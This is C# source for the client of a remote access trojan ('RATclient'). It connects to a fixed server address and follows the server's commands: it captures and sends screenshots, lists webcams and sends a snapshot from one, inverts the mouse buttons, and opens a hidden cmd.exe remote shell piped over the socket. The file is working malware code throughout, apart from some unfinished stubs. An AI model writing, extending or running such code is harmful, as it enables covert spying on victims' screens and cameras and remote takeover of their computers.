using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;


/*
Read Server.py for packet format
*/
namespace RATclient
{
    internal class Program
    {
        static Socket socket;

        [DllImport("user32.dll")]
        static extern Int32 SwapMouseButton(Int32 bSwap);
        
        [DllImport("user32.dll")]
        static extern Int32 MessageBox(IntPtr hWnd, String text, String caption, uint type);
        
        static void Main(string[] args)
        {
            socket = new Socket(SocketType.Stream, ProtocolType.Tcp);
            socket.Connect("192.168.1.2", 5552);
            Console.WriteLine("Connected");

            while (true)
            {
                byte[] lenBuff = new byte[10];

                // First 10 bytes are the length of the data to be received.
                socket.Receive(lenBuff, 10, SocketFlags.None);

                int len = int.Parse(Encoding.UTF8.GetString(lenBuff));

                List<byte> recv = new List<byte>();
                byte[] tmp = new byte[1];
                while (recv.Count < len)
                {
                    socket.Receive(tmp, 1, SocketFlags.None);
                    recv.AddRange(tmp);
                }

                // This is gonna be a problem maybe later when receiving 
                // images, trying to decode image bytes 
                string data = Encoding.UTF8.GetString(recv.ToArray());
                HandleData(data);
            }
        }

        static void HandleData(string data)
        {
            char commandID = data[0];
            data = data.Substring(1);

            Console.WriteLine(commandID);
            Console.WriteLine(data);
            if (commandID == 'i')
            {
                // pc info
                string msg = "oriPC";
                Send(msg);

            }
            else if(commandID == 's')
            {
                // screenshot
                Send(CaptureScrShot().ToArray());
                
            }
            else if (commandID == 'I')
            {
                // invert mouse buttons
                SwapMouseButton(int.Parse(data));
            }
            else if (commandID == 'C')
            {
                // Camera
                if (data == "list")
                {
                    FilterInfoCollection col = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                    String d = "";
                    foreach (FilterInfo cam in col)
                    {
                        d += cam.Name + '\n';
                    }

                    d = d.Substring(0, d.Length - 1);
                    Send(d);
                }
                
                else if (data.Contains("snap"))
                {
                    
                    FilterInfoCollection col = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                    Console.WriteLine(data.Substring(4));
                    int deviceID = int.Parse(data.Substring(4))-1;
                    
                    
                    VideoCaptureDevice cam = new VideoCaptureDevice(col[deviceID].MonikerString);
                    cam.NewFrame += (sender, args) =>
                    {
                        MemoryStream ms;
                        
                        using (ms = new MemoryStream())
                        {
                            args.Frame.Save(ms, ImageFormat.Png);
                        }
                        Send(ms.ToArray());
                        
                        cam.Stop();
                        cam.SignalToStop();
                    };
                    cam.Start();
                }
            }
            else if (commandID == 'c')
            {
                // cmd
                startRemoteCMD();
            }
            else
            {
                test();
            }
            
        }

        static void test()
        {
           
            
            
        }

        static void startRemoteCMD()
        {
            // In the works...
            Process p = new Process();
            p.StartInfo = new ProcessStartInfo("cmd.exe");
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;

            p.OutputDataReceived += (sender, args) =>
            {
                //Console.WriteLine(d);
                Send(args.Data);
            };
            Console.WriteLine("started cmd..?");
            
            p.Start();
            p.BeginOutputReadLine();
            
            while (true)
            {
                byte[] lenBuff = new byte[10];

                socket.Receive(lenBuff, 10, SocketFlags.None);

                int len = int.Parse(Encoding.UTF8.GetString(lenBuff));

                List<byte> recv = new List<byte>();
                byte[] tmp = new byte[1];
                while (recv.Count < len)
                {
                    socket.Receive(tmp, 1, SocketFlags.None);
                    recv.Add(tmp[0]);
                }

                string data = Encoding.UTF8.GetString(recv.ToArray());
                Console.WriteLine("CMD: " + data);
                if (data.ToLower() == "exit")
                    break;
                p.StandardInput.WriteLine(data);
            }
            Send("exit");
            p.StandardOutput.Close();
            p.StandardInput.Close();
            p.Close();
            p.Dispose();
        }

        static void Send(String data)
        {
            String msg = $"{data.Length.ToString().PadLeft(10, '0')}{data}";
            Console.WriteLine(msg);
            socket.Send(Encoding.UTF8.GetBytes(msg));
        }
        
        static void Send(byte[] data)
        {
            
            String len = $"{(data.Length).ToString().PadLeft(10, '0')}";

            socket.Send(Encoding.UTF8.GetBytes(len));
            socket.Send(data);
        }

        static MemoryStream CaptureScrShot()
        {
            MemoryStream ms;
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage((bitmap)))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                using (ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Png);
                }
            }

            return ms;
        }
    }
}